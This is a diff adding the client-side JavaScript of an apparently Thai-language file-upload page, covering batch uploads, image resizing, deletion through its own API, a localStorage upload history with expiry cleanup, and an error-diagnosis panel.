+        html += '<button class="mf-remove" data-idx="' + i + '" title="ลบออก"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>';
+      }
+      html += '</div>';
+    });
+    multiFileList.innerHTML = html;
+    multiFileList.querySelectorAll('.mf-remove').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var idx = parseInt(this.getAttribute('data-idx'), 10);
+        if (selectedFiles[idx] && selectedFiles[idx]._objUrl) URL.revokeObjectURL(selectedFiles[idx]._objUrl);
+        selectedFiles.splice(idx, 1);
+        renderFileList();
+      });
+    });
+  }
+  function clearFile() {
+    selectedFiles.forEach(function(f) { if (f._objUrl) URL.revokeObjectURL(f._objUrl); });
+    selectedFiles = [];
+    previewArea.style.display = 'none';
+    fileInput.value = '';
+  }
+  function startUpload() {
+    if (!selectedFiles.length) {
+      Swal.fire({ icon:'warning', title:'ยังไม่ได้เลือกไฟล์', text:'กรุณาเลือกไฟล์ก่อนอัพโหลด', confirmButtonText:'ตกลง' });
+      return;
+    }
+    uploadBtn.disabled = true;
+    btnIconWrap.innerHTML = '<div class="spinner"></div>';
+    hideError(); debugPanel.style.display = 'none'; resultCard.style.display = 'none';
+    var resizeVal  = document.getElementById('resizeOpt').value;
+    var qualityVal = '';
+    var total = selectedFiles.length;
+    var doneCount = 0;
+    var failCount = 0;
+    var lastUrl = '';
+
+    function uploadOne(idx) {
+      if (idx >= selectedFiles.length) {
+        // all done
+        progressWrap.style.display = 'none';
+        resetBtn();
+        renderFileList();
+        if (failCount === 0) {
+          if (total === 1) {
+            Swal.fire({ icon:'success', title:'อัพโหลดสำเร็จ!', text:selectedFiles[0] ? selectedFiles[0].name : '', timer:2500, timerProgressBar:true, showConfirmButton:false });
+          } else {
+            Swal.fire({ icon:'success', title:'อัพโหลดสำเร็จทั้งหมด!', text:'อัพโหลด ' + doneCount + ' ไฟล์เรียบร้อย', timer:2500, timerProgressBar:true, showConfirmButton:false });
+          }
+          clearFile();
+        } else {
+          Swal.fire({ icon: failCount === total ? 'error' : 'warning', title:'อัพโหลดเสร็จสิ้น', text:'สำเร็จ ' + doneCount + ' ไฟล์, ล้มเหลว ' + failCount + ' ไฟล์', confirmButtonText:'ตกลง' });
+        }
+        return;
+      }
+      var capturedFile = selectedFiles[idx];
+      capturedFile._uploading = true;
+      renderFileList();
+      btnText.textContent = 'กำลังอัพโหลด ' + (idx+1) + '/' + total + '...';
+      showProgress(0, 'กำลังเตรียมไฟล์ ' + (idx+1) + '/' + total + '...');
+      var isImage = capturedFile.type.indexOf('image/') === 0 && capturedFile.type !== 'image/gif';
+
+      function doUpload(dataUrl, overrideType) {
+        var base64Data = dataUrl.split(',')[1];
+        var fileType = overrideType || capturedFile.type;
+        showProgress(20, 'กำลังอัพโหลดไฟล์ ' + (idx+1) + '/' + total + '...');
+        var prog = 20;
+        var progTimer = setInterval(function() {
+          prog = Math.min(prog + Math.random() * 12, 85);
+          showProgress(prog, 'กำลังอัพโหลดสู่เซิฟเวอร์ ' + (idx+1) + '/' + total + '...');
+        }, 400);
+        fetch('/api/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            file: base64Data, name: capturedFile.name, type: fileType,
+            resize: resizeVal, quality: qualityVal,
+            expiry: document.getElementById('expiryOpt').value,
+            folder: capturedFile.type.indexOf('image/') === 0 ? 'image' : capturedFile.type.indexOf('video/') === 0 ? 'video' : 'uploads',
+          }),
+        })
+          .then(function(res) {
+            clearInterval(progTimer);
+            var s = res.status; var st = res.statusText;
+            return res.text().then(function(raw) { return { status:s, statusText:st, raw:raw, ok:res.ok }; });
+          })
+          .then(function(r) {
+            var parsed = null;
+            try { parsed = JSON.parse(r.raw); } catch(e) {}
+            capturedFile._uploading = false;
+            if (!r.ok || !parsed || !parsed.success) {
+              failCount++;
+              capturedFile._status = 'fail';
+              capturedFile._statusMsg = 'ล้มเหลว: ' + ((parsed && parsed.error) ? parsed.error : ('HTTP ' + r.status));
+              renderFileList();
+              uploadOne(idx + 1);
+              return;
+            }
+            showProgress(100, 'ไฟล์ ' + (idx+1) + '/' + total + ' สำเร็จ!');
+            doneCount++;
+            capturedFile._status = 'done';
+            capturedFile._statusMsg = 'สำเร็จ ✓';
+            lastUrl = parsed.url || '';
+            resultUrl.value = lastUrl;
+            resultCard.style.display = 'block';
+            addHistory({ name:capturedFile.name, size:capturedFile.size, url:parsed.url, path:parsed.path||'', type:capturedFile.type, ts:Date.now(), expires_at:parsed.expires_at||null });
+            renderFileList();
+            setTimeout(function() { uploadOne(idx + 1); }, 300);
+          })
+          .catch(function(err) {
+            clearInterval(progTimer);
+            capturedFile._uploading = false;
+            failCount++;
+            capturedFile._status = 'fail';
+            capturedFile._statusMsg = 'เชื่อมต่อไม่ได้';
+            renderFileList();
+            uploadOne(idx + 1);
+          });
+      }
+      var reader = new FileReader();
+      reader.onload = function(ev) {
+        var originalDataUrl = ev.target.result;
+        if (isImage && (resizeVal || qualityVal)) {
+          showProgress(5, 'กำลังปรับขนาดรูป...');
+          var img = new Image();
+          img.onload = function() {
+            var canvas = document.createElement('canvas');
+            var maxW   = resizeVal ? parseInt(resizeVal, 10) : img.width;
+            var ratio  = Math.min(maxW / img.width, 1);
+            canvas.width  = Math.round(img.width  * ratio);
+            canvas.height = Math.round(img.height * ratio);
+            canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
+            var q = qualityVal ? (parseInt(qualityVal, 10) / 100) : 0.92;
+            doUpload(canvas.toDataURL('image/jpeg', q), 'image/jpeg');
+          };
+          img.onerror = function() { doUpload(originalDataUrl); };
+          img.src = originalDataUrl;
+        } else {
+          doUpload(originalDataUrl);
+        }
+      };
+      reader.onerror = function() {
+        capturedFile._uploading = false;
+        failCount++;
+        capturedFile._status = 'fail';
+        capturedFile._statusMsg = 'อ่านไฟล์ไม่ได้';
+        renderFileList();
+        uploadOne(idx + 1);
+      };
+      reader.readAsDataURL(capturedFile);
+    }
+    uploadOne(0);
+  }
+  function resetBtn() {
+    uploadBtn.disabled = false;
+    btnIconWrap.innerHTML = SVG_UPLOAD;
+    btnText.textContent = 'อัพโหลดเลย';
+  }
+  function deleteFromGitHub(filePath, idx, itemEl) {
+    Swal.fire({
+      title: 'ยืนยันการลบ?',
+      html: 'ไฟล์จะถูกลบออกจาก<b>เซิฟเวอร์</b>และประวัติการอัพโหลด<br><small style="color:var(--muted);font-family:var(--mono)">' + esc(filePath) + '</small>',
+      icon: 'warning',
+      showCancelButton: true,
+      confirmButtonText: 'ลบเลย',
+      cancelButtonText: 'ยกเลิก',
+      reverseButtons: true,
+    }).then(function(result) {
+      if (!result.isConfirmed) return;
+      var delBtn = itemEl ? itemEl.querySelector('.del-btn') : null;
+      if (delBtn) { delBtn.classList.add('loading'); delBtn.innerHTML = SVG_SPIN; }
+      fetch('/api/delete', {
+        method: 'DELETE',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ path: filePath }),
+      })
+        .then(function(res) { return res.json().then(function(d) { return { ok:res.ok, data:d }; }); })
+        .then(function(r) {
+          if (!r.ok) {
+            Swal.fire({ icon:'error', title:'ลบไม่สำเร็จ', text: r.data.error || 'เกิดข้อผิดพลาด' });
+            if (delBtn) { delBtn.classList.remove('loading'); delBtn.innerHTML = SVG_TRASH; }
+            return;
+          }
+          if (itemEl) {
+            itemEl.style.opacity = '0';
+            itemEl.style.transform = 'translateX(30px)';
+            setTimeout(function() {
+              uploadHistory.splice(idx, 1);
+              try { localStorage.setItem('pv_history', JSON.stringify(uploadHistory)); } catch(e) {}
+              renderHistory();
+              Swal.fire({ icon:'success', title:'ลบสำเร็จ', text:'ลบไฟล์ออกจากเซิฟเวอร์แล้ว', timer:2000, timerProgressBar:true, showConfirmButton:false });
+            }, 250);
+          }
+        })
+        .catch(function(err) {
+          Swal.fire({ icon:'error', title:'ลบไม่สำเร็จ', text:'เชื่อมต่อ server ไม่ได้: ' + err.message });
+          if (delBtn) { delBtn.classList.remove('loading'); delBtn.innerHTML = SVG_TRASH; }
+        });
+    });
+  }
+  function showDbg(info) {
+    var sc = info.netErr ? 'err' : (info.status < 300 ? 'ok' : 'err');
+    var sd = info.netErr ? ('Network Error: ' + info.netMsg) : (info.status + ' ' + info.statusText);
+    var cause = '';
+    if (info.netErr) cause = 'fetch() ล้มเหลว — Vercel function ไม่ตอบสนอง';
+    else if (info.status===401||info.status===403) cause = 'GITHUB_TOKEN ผิด / หมดอายุ / ไม่มี scope: repo';
+    else if (info.status===404) cause = 'GITHUB_OWNER หรือ GITHUB_REPO ผิด';
+    else if (info.status===500) {
+      if (info.raw && info.raw.indexOf('missing')!==-1) cause = 'ยังไม่ได้ตั้ง Environment Variables — ต้อง Redeploy';
+      else cause = 'Server crash — ดู Response Raw ด้านล่าง';
+    } else if (info.status===502||info.status===504) cause = 'Vercel function crash';
+    var rawDisp = info.raw ? (info.raw.length>800 ? info.raw.slice(0,800)+'\n...' : info.raw) : '(ไม่มี response)';
+    var h = '';
+    h += '<div class="dbg-row"><span class="dbg-lbl">ไฟล์</span><span class="dbg-val">'+esc(info.name)+' ('+info.size+', '+(info.type||'?')+')</span></div>';
+    h += '<div class="dbg-row"><span class="dbg-lbl">HTTP Status</span><span class="dbg-val '+sc+'">'+esc(sd)+'</span></div>';
+    if (cause) h += '<hr class="dbg-sep"><div class="dbg-row"><span class="dbg-lbl">สาเหตุ</span><span class="dbg-val warn">'+esc(cause)+'</span></div>';
+    h += '<hr class="dbg-sep"><div class="dbg-row"><span class="dbg-lbl">Response Raw</span></div>';
+    h += '<div class="dbg-raw" id="dbgRaw">'+esc(rawDisp)+'</div>';
+    h += '<button class="dbg-copy" id="dbgCopyBtn">'+SVG_COPY+' คัดลอก</button>';
+    debugBody.innerHTML = h;
+    debugPanel.style.display = 'block';
+    debugPanel.scrollIntoView({ behavior:'smooth', block:'nearest' });
+    document.getElementById('dbgCopyBtn').addEventListener('click', function() {
+      navigator.clipboard.writeText(document.getElementById('dbgRaw').textContent).then(function() {
+        var b=document.getElementById('dbgCopyBtn'); if(b){b.innerHTML=SVG_CHECK+' คัดลอกแล้ว';setTimeout(function(){var x=document.getElementById('dbgCopyBtn');if(x)x.innerHTML=SVG_COPY+' คัดลอก';},1500);}
+      });
+    });
+  }
+  function showProgress(pct, lbl) {
+    progressWrap.style.display = 'block';
+    progressLbl.textContent = lbl; progressPct.textContent = Math.round(pct)+'%';
+    progressFill.style.width = pct+'%';
+  }
+  function showError(msg) { errorBox.style.display = 'flex'; errorText.textContent = msg; }
+  function hideError()    { errorBox.style.display = 'none'; errorText.textContent = ''; }
+  function doCopyIcon(input, btn) {
+    navigator.clipboard.writeText(input.value).then(function() {
+      btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0"><polyline points="20 6 9 17 4 12"/></svg>';
+      btn.classList.add('copied');
+      setTimeout(function() {
+        btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
+        btn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+
+  function doCopy(input, btn, resetHtml) {
+    navigator.clipboard.writeText(input.value).then(function() {
+      btn.innerHTML = SVG_CHECK+' คัดลอกแล้ว'; btn.classList.add('copied');
+      setTimeout(function(){ btn.innerHTML = resetHtml; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+  function addHistory(item) {
+    uploadHistory.unshift(item);
+    if (uploadHistory.length > 50) uploadHistory.pop();
+    try { localStorage.setItem('pv_history', JSON.stringify(uploadHistory)); } catch(e) {}
+    renderHistory();
+  }
+  function renderHistory() {
+    if (!uploadHistory.length) { historyCard.style.display = 'none'; return; }
+    historyCard.style.display = 'block';
+    historyCount.textContent = uploadHistory.length;
+    var iconImg  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px;color:var(--muted)"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
+    var iconVid  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px;color:var(--muted)"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>';
+    var iconFile = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px;color:var(--muted)"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
+    var html = '';
+    var items = uploadHistory.slice(0, 50);
+    for (var i = 0; i < items.length; i++) {
+      var h = items[i];
+      var thumb;
+      if (h.type && h.type.indexOf('image/') === 0) {
+        thumb = '<img data-url="' + esc(h.url) + '" style="width:100%;height:100%;object-fit:cover;display:block;opacity:0;transition:opacity .3s">';
+      } else if (h.type && h.type.indexOf('video/') === 0) {
+        thumb = '<video data-url="' + esc(h.url) + '" style="width:100%;height:100%;object-fit:cover;display:block;opacity:0;transition:opacity .3s" preload="metadata" muted playsinline></video>';
+      } else {
+        thumb = iconFile;
+      }
+      html += '<div class="hist-item" data-aos="fade-left" data-aos-duration="400" data-aos-delay="'+(i*40)+'">';
+      html += '<div class="hist-thumb">'+thumb+'</div>';
+      html += '<div class="hist-info">';
+      html += '<div class="hist-name">'+esc(h.name)+'</div>';
+      html += '<div class="hist-meta">'+formatBytes(h.size)+' &middot; '+timeAgo(h.ts)+(h.expires_at ? ' &middot; <span style="color:#fbbf24">หมดอายุ: '+formatExpiry(h.expires_at)+'</span>' : '')+'</div>';
+      html += '</div>';
+      html += '<div class="hist-actions">';
+      html += '<button class="hist-btn copy-btn" data-url="'+esc(h.url)+'" title="คัดลอกลิงก์">'+SVG_COPY+'</button>';
+      html += '<button class="hist-btn del-btn" data-idx="'+i+'" data-path="'+esc(h.path||'')+'" title="ลบไฟล์">'+SVG_TRASH+'</button>';
+      html += '</div>';
+      html += '</div>';
+    }
+    historyList.innerHTML = html;
+    AOS.refresh();
+    // poll each media URL via fetch until it responds OK or 10s elapsed
+    historyList.querySelectorAll('.hist-thumb [data-url]').forEach(function(el) {
+      var url = el.getAttribute('data-url');
+      if (!url) return;
+      var start = Date.now();
+      var delay = 400;
+      function tryLoad() {
+        fetch(url, { method: 'HEAD', cache: 'no-store' })
+          .then(function(r) {
+            if (r.ok) {
+              el.src = url;
+              if (el.tagName === 'VIDEO') el.load();
+              el.onload = el.onloadeddata = function() { el.style.opacity = '1'; };
+              // fallback fade in after brief delay even if event doesn't fire
+              setTimeout(function() { el.style.opacity = '1'; }, 600);
+            } else {
+              if (Date.now() - start < 10000) setTimeout(tryLoad, delay);
+              delay = Math.min(delay * 1.5, 2000);
+            }
+          })
+          .catch(function() {
+            if (Date.now() - start < 10000) setTimeout(tryLoad, delay);
+            delay = Math.min(delay * 1.5, 2000);
+          });
+      }
+      tryLoad();
+    });
+    historyList.querySelectorAll('.copy-btn').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var url = this.getAttribute('data-url');
+        var self = this;
+        navigator.clipboard.writeText(url).then(function() {
+          self.innerHTML = SVG_CHECK;
+          setTimeout(function() { self.innerHTML = SVG_COPY; }, 1500);
+        });
+      });
+    });
+    historyList.querySelectorAll('.del-btn').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var idx      = parseInt(this.getAttribute('data-idx'), 10);
+        var filePath = this.getAttribute('data-path');
+        var itemEl   = this.closest('.hist-item');
+        if (!filePath) {
+          Swal.fire({
+            title: 'ลบออกจากประวัติ?',
+            text: 'รายการนี้ไม่มีข้อมูล path จึงไม่สามารถลบจากเซิฟเวอร์ได้ จะลบออกจากประวัติเท่านั้น',
+            icon: 'question',
+            showCancelButton: true,
+            confirmButtonText: 'ลบประวัติ',
+            cancelButtonText: 'ยกเลิก',
+          }).then(function(r) {
+            if (!r.isConfirmed) return;
+            if (itemEl) { itemEl.style.opacity='0'; itemEl.style.transform='translateX(30px)'; }
+            setTimeout(function() {
+              uploadHistory.splice(idx, 1);
+              try { localStorage.setItem('pv_history', JSON.stringify(uploadHistory)); } catch(e) {}
+              renderHistory();
+            }, 250);
+          });
+        } else {
+          deleteFromGitHub(filePath, idx, itemEl);
+        }
+      });
+    });
+  }
+  function formatBytes(b) {
+    if (!b) return '0 B';
+    if (b < 1024) return b + ' B';
+    if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
+    return (b/1048576).toFixed(1) + ' MB';
+  }
+  function timeAgo(ts) {
+    var s = Math.floor((Date.now()-ts)/1000);
+    if (s < 60) return 'เมื่อกี้';
+    if (s < 3600) return Math.floor(s/60) + ' นาทีที่แล้ว';
+    if (s < 86400) return Math.floor(s/3600) + ' ชั่วโมงที่แล้ว';
+    return Math.floor(s/86400) + ' วันที่แล้ว';
+  }
+  function esc(str) {
+    return String(str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+  function formatExpiry(iso) {
+    var ms = new Date(iso).getTime() - Date.now();
+    if (ms <= 0) return 'หมดอายุแล้ว';
+    var s = Math.floor(ms/1000);
+    if (s < 3600)  return 'อีก ' + Math.floor(s/60) + ' นาที';
+    if (s < 86400) return 'อีก ' + Math.floor(s/3600) + ' ชม.';
+    return 'อีก ' + Math.floor(s/86400) + ' วัน';
+  }
+  function checkAndDeleteExpired() {
+    var now = Date.now();
+    var expired = [];
+    uploadHistory.forEach(function(item, idx) {
+      if (item.expires_at && new Date(item.expires_at).getTime() <= now) {
+        expired.push({ idx: idx, item: item });
+      }
+    });
+    if (!expired.length) return;
+    expired.slice().reverse().forEach(function(entry) {
+      if (entry.item.path) {
+        fetch('/api/delete', {
+          method: 'DELETE',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ path: entry.item.path }),
+        }).catch(function(){});
+      }
+      uploadHistory.splice(entry.idx, 1);
+    });
+    try { localStorage.setItem('pv_history', JSON.stringify(uploadHistory)); } catch(e) {}
+    renderHistory();
+    Swal.fire({
+      icon: 'info', title: 'ลบไฟล์หมดอายุ',
+      text: 'ลบไฟล์ที่หมดอายุ ' + expired.length + ' ไฟล์ออกจากเซิฟเวอร์แล้ว',
+      timer: 3000, timerProgressBar: true, showConfirmButton: false,
+    });
+  }
+  checkAndDeleteExpired();
+  setInterval(checkAndDeleteExpired, 60000);
+  uploadHistory.forEach(function(item) {
+    if (item.expires_at) {
+      var ms = new Date(item.expires_at).getTime() - Date.now();
+      if (ms > 0 && ms < 86400000) setTimeout(checkAndDeleteExpired, ms + 500);
+    }
+  });
+  renderHistory();
+})();</script>
+</body>
+</html>
